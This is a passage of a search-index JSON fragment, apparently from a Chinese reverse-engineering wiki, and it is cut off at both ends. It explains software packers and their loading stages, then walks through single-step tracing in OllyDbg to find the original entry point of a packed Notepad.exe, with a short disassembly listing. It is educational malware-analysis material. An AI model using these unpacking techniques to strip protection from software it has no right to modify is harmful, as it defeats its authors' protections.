            "text": "\u8ba4\u8bc6\u58f3\u662f\u4ec0\u4e48\n\n\n\u58f3\n \u662f\u5728\u4e00\u4e9b\u8ba1\u7b97\u673a\u8f6f\u4ef6\u91cc\u4e5f\u6709\u4e00\u6bb5\u4e13\u95e8\u8d1f\u8d23\u4fdd\u62a4\u8f6f\u4ef6\u4e0d\u88ab\u975e\u6cd5\u4fee\u6539\u6216\u53cd\u7f16\u8bd1\u7684\u7a0b\u5e8f\u3002\n\n\n\u5b83\u4eec\u4e00\u822c\u90fd\u662f\u5148\u4e8e\u7a0b\u5e8f\u8fd0\u884c\uff0c\u62ff\u5230\u63a7\u5236\u6743\uff0c\u7136\u540e\u5b8c\u6210\u5b83\u4eec\u4fdd\u62a4\u8f6f\u4ef6\u7684\u4efb\u52a1\u3002\n\n\n\n\n\u7531\u4e8e\u8fd9\u6bb5\u7a0b\u5e8f\u548c\u81ea\u7136\u754c\u7684\u58f3\u5728\u529f\u80fd\u4e0a\u6709\u5f88\u591a\u76f8\u540c\u7684\u5730\u65b9\uff0c\u57fa\u4e8e\u547d\u540d\u7684\u89c4\u5219\uff0c\u5c31\u628a\u8fd9\u6837\u7684\u7a0b\u5e8f\u79f0\u4e3a \n\u58f3\n \u4e86\u3002\n\n\n\u58f3\u7684\u5206\u7c7b\n\n\n\u6211\u4eec\u901a\u5e38\u5c06 \n\u58f3\n \u5206\u4e3a\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f\u538b\u7f29\u58f3\uff0c\u53e6\u4e00\u7c7b\u662f\u52a0\u5bc6\u58f3\u3002\n\n\n\u538b\u7f29\u58f3\n\n\n\u538b\u7f29\u58f3\u65e9\u5728 DOS \u65f6\u4ee3\u5c31\u5df2\u7ecf\u51fa\u73b0\u4e86\uff0c\u4f46\u662f\u5f53\u65f6\u56e0\u4e3a\u8ba1\u7b97\u80fd\u529b\u6709\u9650\uff0c\u89e3\u538b\u5f00\u9500\u8fc7\u5927\uff0c\u5e76\u6ca1\u6709\u5f97\u5230\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\n\n\n\u4f7f\u7528\u538b\u7f29\u58f3\u53ef\u4ee5\u5e2e\u52a9\u7f29\u51cf PE \u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9690\u85cf\u4e86 PE \u6587\u4ef6\u5185\u90e8\u4ee3\u7801\u548c\u8d44\u6e90\uff0c\u4fbf\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u4fdd\u5b58\u3002\n\n\n\u901a\u5e38\u538b\u7f29\u58f3\u6709\u4e24\u7c7b\u7528\u9014\uff0c\u4e00\u79cd\u53ea\u662f\u5355\u7eaf\u7528\u4e8e\u538b\u7f29\u666e\u901a PE \u6587\u4ef6\u7684\u538b\u7f29\u58f3\uff0c\u800c\u53e6\u4e00\u79cd\u5219\u4f1a\u5bf9\u6e90\u6587\u4ef6\u8fdb\u884c\u8f83\u5927\u53d8\u5f62\uff0c\u4e25\u91cd\u7834\u574f PE \u6587\u4ef6\u5934\uff0c\u7ecf\u5e38\u7528\u4e8e\u538b\u7f29\u6076\u610f\u7a0b\u5e8f\u3002\n\n\n\u5e38\u89c1\u7684\u538b\u7f29\u58f3\u6709\uff1aUpx\u3001ASpack\u3001PECompat\n\n\n\u52a0\u5bc6\u58f3\n\n\n\u52a0\u5bc6\u58f3\u6216\u79f0\u4fdd\u62a4\u58f3\uff0c\u5e94\u7528\u6709\u591a\u79cd\u9632\u6b62\u4ee3\u7801\u9006\u5411\u5206\u6790\u7684\u6280\u672f\uff0c\u5b83\u6700\u4e3b\u8981\u7684\u529f\u80fd\u662f\u4fdd\u62a4 PE \u514d\u53d7\u4ee3\u7801\u9006\u5411\u5206\u6790\u3002\n\n\n\u7531\u4e8e\u52a0\u5bc6\u58f3\u7684\u4e3b\u8981\u76ee\u7684\u4e0d\u518d\u662f\u538b\u7f29\u6587\u4ef6\u8d44\u6e90\uff0c\u6240\u4ee5\u52a0\u5bc6\u58f3\u4fdd\u62a4\u7684 PE \u7a0b\u5e8f\u901a\u5e38\u6bd4\u539f\u6587\u4ef6\u5927\u5f97\u591a\u3002\n\n\n\u76ee\u524d\u52a0\u5bc6\u58f3\u5927\u91cf\u7528\u4e8e\u5bf9\u5b89\u5168\u6027\u8981\u6c42\u9ad8\uff0c\u5bf9\u7834\u89e3\u654f\u611f\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u6709\u6076\u610f\u7a0b\u5e8f\u7528\u4e8e\u907f\u514d\uff08\u964d\u4f4e\uff09\u6740\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b\u67e5\u6740\u3002\n\n\n\u5e38\u89c1\u7684\u52a0\u5bc6\u58f3\u6709\uff1aASProtector\u3001Armadillo\u3001EXECryptor\u3001Themida\u3001VMProtect\n\n\n\u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b\n\n\n\u4fdd\u5b58\u5165\u53e3\u53c2\u6570\n\n\n\n\n\u52a0\u58f3\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u4fdd\u5b58\u5404\u5bc4\u5b58\u5668\u7684\u503c\n\n\n\u5916\u58f3\u6267\u884c\u5b8c\u6bd5\uff0c\u6062\u590d\u5404\u5bc4\u5b58\u5668\u503c\n\n\n\u6700\u540e\u518d\u8df3\u5230\u539f\u7a0b\u5e8f\u6267\u884c\n\n\n\n\n\u901a\u5e38\u7528 \npushad\n / \npopad\n\u3001\npushfd\n / \npopfd\n \u6307\u4ee4\u5bf9\u6765\u4fdd\u5b58\u548c\u6062\u590d\u73b0\u573a\u73af\u5883\n\n\n\u83b7\u53d6\u6240\u9700\u51fd\u6570 API\n\n\n\n\n\u4e00\u822c\u58f3\u7684\u8f93\u5165\u8868\u4e2d\u53ea\u6709 \nGetProcAddress\n\u3001\nGetModuleHandle\n \u548c \nLoadLibrary\n \u8fd9\u51e0\u4e2a API \u51fd\u6570\n\n\n\u5982\u679c\u9700\u8981\u5176\u4ed6 API \u51fd\u6570\uff0c\u5219\u901a\u8fc7 \nLoadLibraryA(W)\n \u6216 \nLoadLibraryExA(W)\n \u5c06 DLL \u6587\u4ef6\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\n\n\n\u5982\u679c DLL \u6587\u4ef6\u5df2\u88ab\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u91cc\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 \nGetModuleHandleA(W)\n \u51fd\u6570\u83b7\u5f97 DLL \u6a21\u5757\u53e5\u67c4\n\n\n\u4e00\u65e6 DLL \u6a21\u5757\u88ab\u52a0\u8f7d\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 \nGetProcAddress\n \u51fd\u6570\u83b7\u53d6\u8f93\u5165\u51fd\u6570\u7684\u5730\u5740\n\n\n\n\n\u89e3\u5bc6\u5404\u533a\u5757\u6570\u636e\n\n\n\n\n\u5904\u4e8e\u4fdd\u62a4\u6e90\u7a0b\u5e8f\u4ee3\u7801\u548c\u6570\u636e\u7684\u76ee\u7684\uff0c\u4e00\u822c\u4f1a\u52a0\u5bc6\u6e90\u7a0b\u5e8f\u6587\u4ef6\u7684\u5404\u4e2a\u533a\u5757\u3002\u5728\u7a0b\u5e8f\u6267\u884c\u65f6\u5916\u58f3\u5c06\u8fd9\u4e9b\u533a\u5757\u6570\u636e\u89e3\u5bc6\uff0c\u4ee5\u8ba9\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\n\n\n\u5916\u58f3\u4e00\u822c\u6309\u533a\u5757\u52a0\u5bc6\uff0c\u6309\u533a\u5757\u89e3\u5bc6\uff0c\u5e76\u5c06\u89e3\u5bc6\u7684\u6570\u636e\u653e\u56de\u5728\u5408\u9002\u7684\u5185\u5b58\u4f4d\u7f6e\n\n\n\n\n\u8df3\u8f6c\u56de\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9\n\n\n\n\n\u5728\u8df3\u8f6c\u56de\u5165\u53e3\u70b9\u4e4b\u524d\uff0c\u4e00\u822c\u4f1a\u6062\u590d\u586b\u5199\u539fPE\u6587\u4ef6\u8f93\u5165\u8868\uff08IAT\uff09\uff0c\u5e76\u5904\u7406\u597d\u91cd\u5b9a\u4f4d\u9879\uff08\u4e3b\u8981\u662f DLL \u6587\u4ef6\uff09\n\n\n\u56e0\u4e3a\u52a0\u58f3\u65f6\u5916\u58f3\u81ea\u5df1\u6784\u9020\u4e86\u4e00\u4e2a\u8f93\u5165\u8868\uff0c\u56e0\u6b64\u5728\u8fd9\u91cc\u9700\u8981\u91cd\u65b0\u5bf9\u6bcf\u4e00\u4e2a DLL \u5f15\u5165\u7684\u6240\u6709\u51fd\u6570\u91cd\u65b0\u83b7\u53d6\u5730\u5740\uff0c\u5e76\u586b\u5199\u5230 IAT \u8868\u4e2d\n\n\n\u505a\u5b8c\u4e0a\u8ff0\u5de5\u4f5c\u540e\uff0c\u4f1a\u5c06\u63a7\u5236\u6743\u79fb\u4ea4\u539f\u7a0b\u5e8f\uff0c\u5e76\u7ee7\u7eed\u6267\u884c", 
            "title": "\u4fdd\u62a4\u58f3\u7b80\u4ecb"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_1", 
            "text": "\u58f3  \u662f\u5728\u4e00\u4e9b\u8ba1\u7b97\u673a\u8f6f\u4ef6\u91cc\u4e5f\u6709\u4e00\u6bb5\u4e13\u95e8\u8d1f\u8d23\u4fdd\u62a4\u8f6f\u4ef6\u4e0d\u88ab\u975e\u6cd5\u4fee\u6539\u6216\u53cd\u7f16\u8bd1\u7684\u7a0b\u5e8f\u3002  \u5b83\u4eec\u4e00\u822c\u90fd\u662f\u5148\u4e8e\u7a0b\u5e8f\u8fd0\u884c\uff0c\u62ff\u5230\u63a7\u5236\u6743\uff0c\u7136\u540e\u5b8c\u6210\u5b83\u4eec\u4fdd\u62a4\u8f6f\u4ef6\u7684\u4efb\u52a1\u3002   \u7531\u4e8e\u8fd9\u6bb5\u7a0b\u5e8f\u548c\u81ea\u7136\u754c\u7684\u58f3\u5728\u529f\u80fd\u4e0a\u6709\u5f88\u591a\u76f8\u540c\u7684\u5730\u65b9\uff0c\u57fa\u4e8e\u547d\u540d\u7684\u89c4\u5219\uff0c\u5c31\u628a\u8fd9\u6837\u7684\u7a0b\u5e8f\u79f0\u4e3a  \u58f3  \u4e86\u3002", 
            "title": "\u8ba4\u8bc6\u58f3\u662f\u4ec0\u4e48"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_2", 
            "text": "\u6211\u4eec\u901a\u5e38\u5c06  \u58f3  \u5206\u4e3a\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f\u538b\u7f29\u58f3\uff0c\u53e6\u4e00\u7c7b\u662f\u52a0\u5bc6\u58f3\u3002", 
            "title": "\u58f3\u7684\u5206\u7c7b"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_3", 
            "text": "\u538b\u7f29\u58f3\u65e9\u5728 DOS \u65f6\u4ee3\u5c31\u5df2\u7ecf\u51fa\u73b0\u4e86\uff0c\u4f46\u662f\u5f53\u65f6\u56e0\u4e3a\u8ba1\u7b97\u80fd\u529b\u6709\u9650\uff0c\u89e3\u538b\u5f00\u9500\u8fc7\u5927\uff0c\u5e76\u6ca1\u6709\u5f97\u5230\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002  \u4f7f\u7528\u538b\u7f29\u58f3\u53ef\u4ee5\u5e2e\u52a9\u7f29\u51cf PE \u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9690\u85cf\u4e86 PE \u6587\u4ef6\u5185\u90e8\u4ee3\u7801\u548c\u8d44\u6e90\uff0c\u4fbf\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u4fdd\u5b58\u3002  \u901a\u5e38\u538b\u7f29\u58f3\u6709\u4e24\u7c7b\u7528\u9014\uff0c\u4e00\u79cd\u53ea\u662f\u5355\u7eaf\u7528\u4e8e\u538b\u7f29\u666e\u901a PE \u6587\u4ef6\u7684\u538b\u7f29\u58f3\uff0c\u800c\u53e6\u4e00\u79cd\u5219\u4f1a\u5bf9\u6e90\u6587\u4ef6\u8fdb\u884c\u8f83\u5927\u53d8\u5f62\uff0c\u4e25\u91cd\u7834\u574f PE \u6587\u4ef6\u5934\uff0c\u7ecf\u5e38\u7528\u4e8e\u538b\u7f29\u6076\u610f\u7a0b\u5e8f\u3002  \u5e38\u89c1\u7684\u538b\u7f29\u58f3\u6709\uff1aUpx\u3001ASpack\u3001PECompat", 
            "title": "\u538b\u7f29\u58f3"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_4", 
            "text": "\u52a0\u5bc6\u58f3\u6216\u79f0\u4fdd\u62a4\u58f3\uff0c\u5e94\u7528\u6709\u591a\u79cd\u9632\u6b62\u4ee3\u7801\u9006\u5411\u5206\u6790\u7684\u6280\u672f\uff0c\u5b83\u6700\u4e3b\u8981\u7684\u529f\u80fd\u662f\u4fdd\u62a4 PE \u514d\u53d7\u4ee3\u7801\u9006\u5411\u5206\u6790\u3002  \u7531\u4e8e\u52a0\u5bc6\u58f3\u7684\u4e3b\u8981\u76ee\u7684\u4e0d\u518d\u662f\u538b\u7f29\u6587\u4ef6\u8d44\u6e90\uff0c\u6240\u4ee5\u52a0\u5bc6\u58f3\u4fdd\u62a4\u7684 PE \u7a0b\u5e8f\u901a\u5e38\u6bd4\u539f\u6587\u4ef6\u5927\u5f97\u591a\u3002  \u76ee\u524d\u52a0\u5bc6\u58f3\u5927\u91cf\u7528\u4e8e\u5bf9\u5b89\u5168\u6027\u8981\u6c42\u9ad8\uff0c\u5bf9\u7834\u89e3\u654f\u611f\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u6709\u6076\u610f\u7a0b\u5e8f\u7528\u4e8e\u907f\u514d\uff08\u964d\u4f4e\uff09\u6740\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b\u67e5\u6740\u3002  \u5e38\u89c1\u7684\u52a0\u5bc6\u58f3\u6709\uff1aASProtector\u3001Armadillo\u3001EXECryptor\u3001Themida\u3001VMProtect", 
            "title": "\u52a0\u5bc6\u58f3"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_5", 
            "text": "", 
            "title": "\u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_6", 
            "text": "\u52a0\u58f3\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u4fdd\u5b58\u5404\u5bc4\u5b58\u5668\u7684\u503c  \u5916\u58f3\u6267\u884c\u5b8c\u6bd5\uff0c\u6062\u590d\u5404\u5bc4\u5b58\u5668\u503c  \u6700\u540e\u518d\u8df3\u5230\u539f\u7a0b\u5e8f\u6267\u884c   \u901a\u5e38\u7528  pushad  /  popad \u3001 pushfd  /  popfd  \u6307\u4ee4\u5bf9\u6765\u4fdd\u5b58\u548c\u6062\u590d\u73b0\u573a\u73af\u5883", 
            "title": "\u4fdd\u5b58\u5165\u53e3\u53c2\u6570"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#api", 
            "text": "\u4e00\u822c\u58f3\u7684\u8f93\u5165\u8868\u4e2d\u53ea\u6709  GetProcAddress \u3001 GetModuleHandle  \u548c  LoadLibrary  \u8fd9\u51e0\u4e2a API \u51fd\u6570  \u5982\u679c\u9700\u8981\u5176\u4ed6 API \u51fd\u6570\uff0c\u5219\u901a\u8fc7  LoadLibraryA(W)  \u6216  LoadLibraryExA(W)  \u5c06 DLL \u6587\u4ef6\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d  \u5982\u679c DLL \u6587\u4ef6\u5df2\u88ab\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u91cc\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528  GetModuleHandleA(W)  \u51fd\u6570\u83b7\u5f97 DLL \u6a21\u5757\u53e5\u67c4  \u4e00\u65e6 DLL \u6a21\u5757\u88ab\u52a0\u8f7d\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528  GetProcAddress  \u51fd\u6570\u83b7\u53d6\u8f93\u5165\u51fd\u6570\u7684\u5730\u5740", 
            "title": "\u83b7\u53d6\u6240\u9700\u51fd\u6570 API"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_7", 
            "text": "\u5904\u4e8e\u4fdd\u62a4\u6e90\u7a0b\u5e8f\u4ee3\u7801\u548c\u6570\u636e\u7684\u76ee\u7684\uff0c\u4e00\u822c\u4f1a\u52a0\u5bc6\u6e90\u7a0b\u5e8f\u6587\u4ef6\u7684\u5404\u4e2a\u533a\u5757\u3002\u5728\u7a0b\u5e8f\u6267\u884c\u65f6\u5916\u58f3\u5c06\u8fd9\u4e9b\u533a\u5757\u6570\u636e\u89e3\u5bc6\uff0c\u4ee5\u8ba9\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c  \u5916\u58f3\u4e00\u822c\u6309\u533a\u5757\u52a0\u5bc6\uff0c\u6309\u533a\u5757\u89e3\u5bc6\uff0c\u5e76\u5c06\u89e3\u5bc6\u7684\u6570\u636e\u653e\u56de\u5728\u5408\u9002\u7684\u5185\u5b58\u4f4d\u7f6e", 
            "title": "\u89e3\u5bc6\u5404\u533a\u5757\u6570\u636e"
        }, 
        {
            "location": "/reverse/unpack/packer-introduction/#_8", 
            "text": "\u5728\u8df3\u8f6c\u56de\u5165\u53e3\u70b9\u4e4b\u524d\uff0c\u4e00\u822c\u4f1a\u6062\u590d\u586b\u5199\u539fPE\u6587\u4ef6\u8f93\u5165\u8868\uff08IAT\uff09\uff0c\u5e76\u5904\u7406\u597d\u91cd\u5b9a\u4f4d\u9879\uff08\u4e3b\u8981\u662f DLL \u6587\u4ef6\uff09  \u56e0\u4e3a\u52a0\u58f3\u65f6\u5916\u58f3\u81ea\u5df1\u6784\u9020\u4e86\u4e00\u4e2a\u8f93\u5165\u8868\uff0c\u56e0\u6b64\u5728\u8fd9\u91cc\u9700\u8981\u91cd\u65b0\u5bf9\u6bcf\u4e00\u4e2a DLL \u5f15\u5165\u7684\u6240\u6709\u51fd\u6570\u91cd\u65b0\u83b7\u53d6\u5730\u5740\uff0c\u5e76\u586b\u5199\u5230 IAT \u8868\u4e2d  \u505a\u5b8c\u4e0a\u8ff0\u5de5\u4f5c\u540e\uff0c\u4f1a\u5c06\u63a7\u5236\u6743\u79fb\u4ea4\u539f\u7a0b\u5e8f\uff0c\u5e76\u7ee7\u7eed\u6267\u884c", 
            "title": "\u8df3\u8f6c\u56de\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9"
        }, 
        {
            "location": "/reverse/unpack/trace/", 
            "text": "\u5355\u6b65\u8ddf\u8e2a\u6cd5\u7684\u539f\u7406\u5c31\u662f\u901a\u8fc7Ollydbg\u7684\u6b65\u8fc7(F8), \u6b65\u5165(F7)\u548c\u8fd0\u884c\u5230(F4)\u529f\u80fd, \u5b8c\u6574\u8d70\u8fc7\u7a0b\u5e8f\u7684\u81ea\u8131\u58f3\u8fc7\u7a0b, \u8df3\u8fc7\u4e00\u4e9b\u5faa\u73af\u6062\u590d\u4ee3\u7801\u7684\u7247\u6bb5, \u5e76\u7528\u5355\u6b65\u8fdb\u5165\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u4f1a\u7565\u8fc7OEP. \u8fd9\u6837\u53ef\u4ee5\u5728\u8f6f\u4ef6\u81ea\u52a8\u8131\u58f3\u6a21\u5757\u8fd0\u884c\u5b8c\u6bd5\u540e, \u5230\u8fbeOEP, \u5e76dump\u7a0b\u5e8f. \n\n\n\u8981\u70b9\n\n\n\n\n\u6253\u5f00\u7a0b\u5e8f\u6309F8\u5355\u6b65\u5411\u4e0b, \u5c3d\u91cf\u5b9e\u73b0\u5411\u4e0b\u7684jmp\u8df3\u8f6c\n\n\n\u4f1a\u7ecf\u5e38\u9047\u5230\u5927\u7684\u5faa\u73af, \u8fd9\u65f6\u8981\u591a\u7528 F4 \u6765\u8df3\u8fc7\u5faa\u73af\n\n\n\u5982\u679c\u51fd\u6570\u8f7d\u5165\u65f6\u4e0d\u8fdc\u5904\u5c31\u662f\u4e00\u4e2acall(\u8fd1call), \u90a3\u4e48\u6211\u4eec\u5c3d\u91cf\u4e0d\u8981\u76f4\u63a5\u8df3\u8fc7, \u800c\u662f\u8fdb\u5165\u8fd9\u4e2acall\n\n\n\u4e00\u822c\u8df3\u8f6c\u5e45\u5ea6\u5927\u7684jmp\u6307\u4ee4, \u90fd\u6781\u6709\u53ef\u80fd\u662f\u8df3\u8f6c\u5230\u4e86\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9(OEP)\n\n\n\n\n\u793a\u4f8b\n\n\n\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \n1_trace.zip\n\n\n\u5355\u6b65\u8ddf\u8e2a\u6cd5\u5176\u5b9e\u5c31\u662f\u4e00\u6b65\u4e00\u6b65\u5c3d\u91cf\u4ece\u7a0b\u5e8f\u5165\u53e3\u70b9\u5f80\u4e0b\u8d70, \u5728\u5355\u6b65\u7684\u8fc7\u7a0b\u4e2d\u6ce8\u610fEIP\u4e0d\u8981\u8dd1\u504f\u4e86, \u4f46\u662f\u5bf9\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u590d\u6742\u7684\u58f3\u800c\u8a00, \u5355\u6b65\u7684\u8fc7\u7a0b\u4f1a\u663e\u5f97\u5f02\u5e38\u67af\u71e5\u800c\u4e14\u5bb9\u6613\u628a\u81ea\u5df1\u7ed5\u6655. \u6240\u4ee5\u5355\u6b65\u8ddf\u8e2a\u4e5f\u5e38\u7528\u4e8e\u5206\u6790\u4e00\u4e9b\u5173\u952e\u4ee3\u7801\u90e8\u5206(\u8ddf\u9759\u6001\u5206\u6790\u76f8\u7ed3\u5408), \u800c\u4e0d\u662f\u5b8c\u5168\u5730\u4ece\u5934\u5206\u6790\u5230\u5c3e, \u8fd9\u6709\u8fdd\u9006\u5411\u5de5\u7a0b\u7684\u7406\u5ff5. \n\n\n\u7528Ollydbg\u6253\u5f00\u538b\u7f29\u5305\u5185\u7684Notepad.exe, \u505c\u5728\u4e86\u4e0b\u56fe\u4f4d\u7f6e. \u5165\u53e3\u70b9\u662f\u4e00\u4e2a\npushad\n\u4fdd\u5b58\u6240\u6709\u5bc4\u5b58\u5668\u72b6\u6001\u5230\u6808\u4e2d, \u968f\u540e\u4fbf\u662f\u4e00\u4e2a\ncall\n\u8c03\u7528\u4f4d\u4e8e\n0040D00A\n\u5904\u7684\u51fd\u6570. \u8c03\u7528\u540e\u4fbf\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\n459DD4F7\n\u5904, \u4e4b\u540e\u7684\npush ebp\n\u548c\nretn\n\u663e\u7136\u6ca1\u6709\u4efb\u4f55\u610f\u4e49. \u50cf\u8fd9\u79cd\u5165\u53e3\u70b9\u9644\u8fd1\u5c31\u662f\u4e00\u4e2a\ncall\n\u7684\u6211\u4eec\u79f0\u4e3a\n\u8fd1call\n, \u5bf9\u4e8e\u8fd1call\u6211\u4eec\u9009\u62e9\u6b65\u8fdb, \u6309\u4e0bF7(\u5f53\u7136\u4f60\u4e5f\u53ea\u80fd\u9009\u62e9\u6b65\u8fdb, \u4e0d\u7136EIP\u5c31\u8dd1\u504f\u7a0b\u5e8f\u505c\u6b62\u4e86). \n\n\n\n\n\u6b65\u8fdb\u540e\u53c8\u662f\u4e00\u4e2a\ncall\n, \u6211\u4eec\u7ee7\u7eed\u6b65\u8fdb, \u6309F7, \u8ddf\u8fdb\u540e\u53d1\u73b0\u6ca1\u6709\u8fd1call\u4e86, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5728\u8c03\nGetModuleHandleA\n, \nGetProcAddress\n\u7b49API, \u7ee7\u7eed\u5411\u4e0b\u5206\u6790. \n\n\n\n\n\u4e4b\u540e\u4f1a\u9047\u5230\u591a\u4e2a\u8df3\u8f6c\uff0c\u6211\u4eec\u5c3d\u91cf\u6ee1\u8db3\u5411\u4e0b\u7684\u8df3\u8f6c\uff0c\u5bf9\u4e8e\u5411\u4e0a\u7684\u8df3\u8f6c\u4e0d\u4e88\u5b9e\u73b0\u5e76\u5229\u7528F4\u8df3\u51fa\u5faa\u73af\uff0c\u76f4\u5230\n0040D3AF\n\u5904, \u6211\u4eec\u770b\u4ee5\u4e0b\u7684\u4ee3\u7801\n\n\n0040\nD3AF\n    \n61\n                  \npopad\n\n\n0040\nD3B0\n    \n75\n \n08\n               \njnz\n \nshort\n \nNotePad.0040D3BA\n\n\n0040\nD3B2\n    \nB8\n \n01000000\n         \nmov\n \neax\n,\n0x1\n\n\n0040\nD3B7\n    \nC2\n \n0\nC00\n             \nretn\n \n0xC\n\n\n0040\nD3BA\n    \n68\n \nCC104000\n         \npush\n \nNotePad.004010CC\n\n\n0040\nD3BF\n    \nC3\n                  \nretn\n\n\n\n\n\n\u8fd9\u91cc\npopad\n\u53ef\u4ee5\u6062\u590d\u5728\u7a0b\u5e8f\u5165\u53e3\u70b9\u5904\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u72b6\u6001, \u7136\u540e\njnz\n\u8df3\u8f6c\u5230\n0040D3BA\n\u5904, \u8fd9\u91cc\u662f\u5229\u7528\npush\n\u548c\nretn\n\u6765\u5c06\nEIP\n\u6539\u53d8\u4e3a\n004010CC\n, \u4e5f\u5c31\u662f\u8bf4\u5728\u58f3\u89e3\u538b\u5b8c\u4ee3\u7801\u7b49\u8d44\u6e90\u5b8c\u6bd5\u540e, \u5c06\u901a\u8fc7\njnz\n\u8df3\u8f6c\u5230\npush\n\u5904, \u7136\u540e\u901a\u8fc7\npush\n\u548c\nret\n\u5c06\nEIP\n\u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u539f\u6765\u7684\u5165\u53e3\u70b9(OEP)\u5e76\u8fd4\u56de\u5230OEP\u5904, \u7136\u540e\u7ee7\u7eed\u6267\u884c\u539f\u7a0b\u5e8f\u7684\u4ee3\u7801. \u6211\u4eec\u6267\u884c\u5230\nretn\n\u8fd4\u56de\u540e, \u53ef\u4ee5\u770b\u5230\u5982\u4e0b:\n\n\n\n\n\u663e\u7136, \u6211\u4eec\u5230\u4e86\u4e00\u5806\u88ab\nOllydbg\n\u8bef\u8ba4\u4e3a\u662f\u6570\u636e\u7684\u5730\u65b9\u7ee7\u7eed\u6267\u884c, \u663e\u7136\nOllydbg\n\u5206\u6790\u9519\u8bef\u4e86, \u6211\u4eec\u9700\u8981\u8ba9\nOllydbg\n\u91cd\u65b0\u5206\u6790, \u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u9009\u62e9\n\u5206\u6790-\n\u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790\n, \u6216\u662f\u6309\u4e0b\nctrl+a\n, \u8fd9\u65f6\u6b63\u786e\u5730\u663e\u793a\u51faOEP\u5904\u7684\u6c47\u7f16\u6307\u4ee4.", 
            "title": "\u5355\u6b65\u8ddf\u8e2a\u6cd5"
        }, 
        {
            "location": "/reverse/unpack/trace/#_1", 
            "text": "\u6253\u5f00\u7a0b\u5e8f\u6309F8\u5355\u6b65\u5411\u4e0b, \u5c3d\u91cf\u5b9e\u73b0\u5411\u4e0b\u7684jmp\u8df3\u8f6c  \u4f1a\u7ecf\u5e38\u9047\u5230\u5927\u7684\u5faa\u73af, \u8fd9\u65f6\u8981\u591a\u7528 F4 \u6765\u8df3\u8fc7\u5faa\u73af  \u5982\u679c\u51fd\u6570\u8f7d\u5165\u65f6\u4e0d\u8fdc\u5904\u5c31\u662f\u4e00\u4e2acall(\u8fd1call), \u90a3\u4e48\u6211\u4eec\u5c3d\u91cf\u4e0d\u8981\u76f4\u63a5\u8df3\u8fc7, \u800c\u662f\u8fdb\u5165\u8fd9\u4e2acall  \u4e00\u822c\u8df3\u8f6c\u5e45\u5ea6\u5927\u7684jmp\u6307\u4ee4, \u90fd\u6781\u6709\u53ef\u80fd\u662f\u8df3\u8f6c\u5230\u4e86\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9(OEP)", 
            "title": "\u8981\u70b9"
        }, 
        {
            "location": "/reverse/unpack/trace/#_2", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d:  1_trace.zip  \u5355\u6b65\u8ddf\u8e2a\u6cd5\u5176\u5b9e\u5c31\u662f\u4e00\u6b65\u4e00\u6b65\u5c3d\u91cf\u4ece\u7a0b\u5e8f\u5165\u53e3\u70b9\u5f80\u4e0b\u8d70, \u5728\u5355\u6b65\u7684\u8fc7\u7a0b\u4e2d\u6ce8\u610fEIP\u4e0d\u8981\u8dd1\u504f\u4e86, \u4f46\u662f\u5bf9\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u590d\u6742\u7684\u58f3\u800c\u8a00, \u5355\u6b65\u7684\u8fc7\u7a0b\u4f1a\u663e\u5f97\u5f02\u5e38\u67af\u71e5\u800c\u4e14\u5bb9\u6613\u628a\u81ea\u5df1\u7ed5\u6655. \u6240\u4ee5\u5355\u6b65\u8ddf\u8e2a\u4e5f\u5e38\u7528\u4e8e\u5206\u6790\u4e00\u4e9b\u5173\u952e\u4ee3\u7801\u90e8\u5206(\u8ddf\u9759\u6001\u5206\u6790\u76f8\u7ed3\u5408), 